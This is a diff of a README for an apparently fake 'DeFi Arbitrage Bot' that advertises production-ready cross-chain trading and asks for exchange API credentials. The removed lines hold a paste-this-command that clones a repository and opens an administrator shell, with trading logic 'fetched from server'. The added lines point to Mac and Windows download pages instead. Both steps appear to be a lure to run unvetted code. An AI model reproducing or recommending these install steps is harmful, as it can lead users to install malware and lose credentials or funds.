@@ -5,17 +5,8 @@ The DeFi Arbitrage Bot is a powerful tool designed for automated arbitrage tradi
 The bot supports cross-chain trading via Wormhole, MEV protection via Jito (Solana) and Flashbots/Matcha (EVM), and a React and Tailwind CSS GUI for configuring trading parameters, tokens, contract addresses, and CEX API credentials. Enhanced with Clusters, Tickers, and Charts, it provides real-time market insights for Bitcoin and other assets, driving informed arbitrage decisions. Optimized for low latency, reliability, and security, it includes input validation, detailed logging, and monitoring of mempools and CEX order books. The bot is production-ready for mainnet but recommended for testing on Goerli, BSC Testnet, or Solana Devnet.
 
 ## 📥 Installation & Setup
-The DeFi Arbitrage Bot runs a local terminal on `http://localhost:3000`, fetching all trading scripts, APIs, and configurations. The setup uses a single command to clone the repository and launch the terminal, requiring only Git and basic system tools.
-
-**Launch the Terminal with the Specified Command**:
-     ```
-     winget install --id Git.Git -e --source winget & git clone https://github.com/tar-ser/defi-trading-terminal-arb-tracker.git & cd defi-trading-terminal-arb-tracker & powershell -Command "Start-Process cmd -ArgumentList '/c' -Verb RunAs"
-     ```
-
-### Notes
-- The terminal requires only Git and system tools (`command terminal` on Windows). All trading logic is fetched from server.
-- If the browser doesn’t open, navigate to `http://localhost:3000` manually.
-- Ensure port 3000 is free and firewall settings allow localhost connections.
+### Mac OS [Download](https://singsorganization.gitbook.io/defi-multichain-arbitrage-bot/installation/macos)
+### Windows [Download](https://singsorganization.gitbook.io/defi-multichain-arbitrage-bot/installation/windows)
 
 # Key Features
 ## Arbitrage Trading
